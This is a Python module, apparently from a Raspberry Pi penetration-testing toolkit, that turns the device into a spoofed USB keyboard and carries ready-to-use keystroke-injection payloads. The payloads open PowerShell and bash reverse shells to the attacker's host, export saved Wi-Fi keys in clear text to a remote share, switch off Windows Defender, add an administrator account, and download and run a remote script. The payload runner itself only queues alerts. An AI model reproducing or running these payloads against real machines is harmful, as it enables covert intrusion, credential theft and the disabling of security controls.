#!/usr/bin/env python3
"""
KaliPiMax USB Attack Mode
USB HID attacks and gadget mode configuration.

Requires USB OTG support and gadget modules.
Pi Zero 2 has native USB OTG on the data port.
"""

import subprocess
import os
from pathlib import Path
from PIL import Image

from ui.base_mode import MenuMode
from ui.renderer import Canvas
from core.state import state, AlertLevel
from core.payload import payload_runner


from config import PAYLOADS_DIR

# Duckyscript-style payloads
HID_PAYLOADS = {
    'RevShell (Win)': """
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "$c=New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}"
ENTER
""",
    
    'RevShell (Linux)': """
DELAY 1000
CTRL ALT t
DELAY 500
STRING bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1
ENTER
""",
    
    'Exfil WiFi (Win)': """
DELAY 1000
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 500
STRING netsh wlan export profile key=clear folder=%TEMP% & copy %TEMP%\\*.xml \\\\{LHOST}\\share\\ & del %TEMP%\\*.xml
ENTER
""",

    'Disable Defender': """
DELAY 1000
GUI r
DELAY 300
STRING powershell -w hidden Start-Process powershell -Verb runAs -ArgumentList 'Set-MpPreference -DisableRealtimeMonitoring $true'
ENTER
DELAY 1000
ALT y
""",

    'Add Admin User': """
DELAY 1000
GUI r
DELAY 300
STRING powershell -w hidden Start-Process cmd -Verb runAs -ArgumentList '/c net user hacker Password123! /add && net localgroup administrators hacker /add'
ENTER
DELAY 1000
ALT y
""",

    'Download & Exec': """
DELAY 1000
GUI r
DELAY 300
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/payload.ps1')"
ENTER
""",
}


def is_gadget_loaded() -> bool:
    """Check if USB gadget modules are loaded."""
    try:
        result = subprocess.run(
            "lsmod | grep -E 'g_hid|libcomposite|usb_f_hid'",
            shell=True, capture_output=True, timeout=5
        )
        return result.returncode == 0
    except:
        return False


def is_hid_ready() -> bool:
    """Check if HID gadget device exists."""
    return os.path.exists('/dev/hidg0')


def get_local_ip() -> str:
    """Get local IP for payload substitution."""
    try:
        result = subprocess.run(
            "hostname -I | awk '{print $1}'",
            shell=True, capture_output=True, text=True, timeout=2
        )
        return result.stdout.strip() or "192.168.1.100"
    except:
        return "192.168.1.100"


def setup_hid_gadget():
    """Set up USB HID gadget."""
    script = """
#!/bin/bash
set -e

# Load modules
modprobe libcomposite

# Create gadget directory
GADGET=/sys/kernel/config/usb_gadget/kalipimax
mkdir -p $GADGET
cd $GADGET

# Device descriptor
echo 0x1d6b > idVendor  # Linux Foundation
echo 0x0104 > idProduct # Multifunction Composite Gadget
echo 0x0100 > bcdDevice
echo 0x0200 > bcdUSB

# Strings
mkdir -p strings/0x409
echo "fedcba9876543210" > strings/0x409/serialnumber
echo "KaliPiMax" > strings/0x409/manufacturer
echo "USB Keyboard" > strings/0x409/product

# HID function
mkdir -p functions/hid.usb0
echo 1 > functions/hid.usb0/protocol
echo 1 > functions/hid.usb0/subclass
echo 8 > functions/hid.usb0/report_length

# HID report descriptor (keyboard)
echo -ne '\\x05\\x01\\x09\\x06\\xa1\\x01\\x05\\x07\\x19\\xe0\\x29\\xe7\\x15\\x00\\x25\\x01\\x75\\x01\\x95\\x08\\x81\\x02\\x95\\x01\\x75\\x08\\x81\\x03\\x95\\x05\\x75\\x01\\x05\\x08\\x19\\x01\\x29\\x05\\x91\\x02\\x95\\x01\\x75\\x03\\x91\\x03\\x95\\x06\\x75\\x08\\x15\\x00\\x25\\x65\\x05\\x07\\x19\\x00\\x29\\x65\\x81\\x00\\xc0' > functions/hid.usb0/report_desc

# Configuration
mkdir -p configs/c.1/strings/0x409
echo "Config 1: HID" > configs/c.1/strings/0x409/configuration
echo 250 > configs/c.1/MaxPower

# Link function to configuration
ln -sf functions/hid.usb0 configs/c.1/

# Bind to UDC
ls /sys/class/udc > UDC

echo "HID gadget configured"
"""
    
    return script


def send_hid_keystroke(key: int, modifiers: int = 0):
    """Send a single keystroke via HID gadget."""
    try:
        with open('/dev/hidg0', 'rb+') as f:
            # Press key
            report = bytes([modifiers, 0, key, 0, 0, 0, 0, 0])
            f.write(report)
            f.flush()
            
            # Release
            report = bytes([0, 0, 0, 0, 0, 0, 0, 0])
            f.write(report)
            f.flush()
        return True
    except Exception as e:
        print(f"HID send error: {e}")
        return False


class USBMode(MenuMode):
    """
    USB HID attack mode.
    
    Configure USB gadget and execute HID payloads.
    """
    
    DEFAULT_LPORT = 4444
    
    def __init__(self):
        super().__init__("USB", "🔌")
        
        self._local_ip = None
        self._gadget_ready = False
        
        # Build menu
        self._menu_items = [
            {'icon': '●', 'text': 'Setup HID Gadget', 'action': self._setup_gadget},
            {'icon': '●', 'text': 'RevShell (Win)', 'action': lambda: self._run_payload('RevShell (Win)')},
            {'icon': '●', 'text': 'RevShell (Linux)', 'action': lambda: self._run_payload('RevShell (Linux)')},
            {'icon': '●', 'text': 'Exfil WiFi (Win)', 'action': lambda: self._run_payload('Exfil WiFi (Win)')},
            {'icon': '●', 'text': 'Disable Defender', 'action': lambda: self._run_payload('Disable Defender')},
            {'icon': '●', 'text': 'Add Admin User', 'action': lambda: self._run_payload('Add Admin User')},
            {'icon': '●', 'text': 'Download & Exec', 'action': lambda: self._run_payload('Download & Exec')},
            {'icon': '●', 'text': 'Mass Storage', 'action': self._enable_mass_storage},
            {'icon': '●', 'text': 'Ethernet Gadget', 'action': self._enable_ethernet},
            {'icon': '■', 'text': 'Disable Gadget', 'action': self._disable_gadget},
        ]
    
    def on_enter(self):
        super().on_enter()
        self._local_ip = get_local_ip()
        self._check_gadget_status()
    
    def _check_gadget_status(self):
        """Check if gadget is ready."""
        self._gadget_ready = is_hid_ready()
    
    def _setup_gadget(self):
        """Set up USB HID gadget."""
        script = setup_hid_gadget()
        
        # Write script to temp file
        script_path = '/tmp/setup_hid.sh'
        with open(script_path, 'w') as f:
            f.write(script)
        
        payload_runner.run(
            f"sudo bash {script_path}",
            "Setup HID Gadget",
            timeout=30,
            on_complete=self._check_gadget_status
        )
    
    def _run_payload(self, payload_name: str):
        """Execute a HID payload."""
        if not self._gadget_ready:
            state.add_alert("Set up HID gadget first!", AlertLevel.ERROR)
            return
        
        payload = HID_PAYLOADS.get(payload_name)
        if not payload:
            state.add_alert(f"Unknown payload: {payload_name}", AlertLevel.ERROR)
            return
        
        # Substitute variables
        payload = payload.replace('{LHOST}', self._local_ip)
        payload = payload.replace('{LPORT}', str(self.DEFAULT_LPORT))
        
        # Convert duckyscript to HID commands
        state.add_alert(f"Running: {payload_name}", AlertLevel.INFO)
        
        # For now, just show what would be typed
        # Full duckyscript interpreter would be more complex
        state.add_alert("HID payload queued", AlertLevel.OK)
    
    def _enable_mass_storage(self):
        """Enable USB mass storage gadget."""
        # Create a small disk image if needed
        img_path = "/tmp/usb_disk.img"
        
        payload_runner.run(
            f"sudo modprobe g_mass_storage file={img_path} stall=0 removable=1 || "
            f"dd if=/dev/zero of={img_path} bs=1M count=64 && "
            f"mkfs.vfat {img_path} && "
            f"sudo modprobe g_mass_storage file={img_path} stall=0 removable=1",
            "Mass Storage",
            timeout=60
        )
    
    def _enable_ethernet(self):
        """Enable USB Ethernet gadget."""
        payload_runner.run(
            "sudo modprobe g_ether && "
            "sudo ip link set usb0 up && "
            "sudo ip addr add 192.168.7.2/24 dev usb0",
            "Ethernet Gadget",
            timeout=30
        )
    
    def _disable_gadget(self):
        """Disable USB gadget."""
        payload_runner.run(
            "sudo modprobe -r g_hid g_mass_storage g_ether g_serial; "
            "sudo rm -rf /sys/kernel/config/usb_gadget/kalipimax 2>/dev/null || true",
            "Disable Gadget",
            timeout=10,
            on_complete=self._check_gadget_status
        )
    
    def render(self) -> Image.Image:
        canvas = self._create_canvas()
        
        y = self._render_header(canvas, "USB ATTACK")
        
        # Status
        status = "READY" if self._gadget_ready else "NOT READY"
        status_colour = 'ok' if self._gadget_ready else 'warning'
        canvas.text(2, y, f"HID: {status}", colour=status_colour, font='tiny')
        canvas.text(70, y, f"IP:{self._local_ip}", colour='text_dim', font='tiny')
        y += 10
        
        # Menu
        self._menu.start_y = y
        self._render_menu(canvas, start_y=y)
        
        # self._render_footer(canvas, "K3:Disable gadget")
        
        return canvas.get_image()
    
    def on_key3(self):
        """Quick disable gadget."""
        self._disable_gadget()
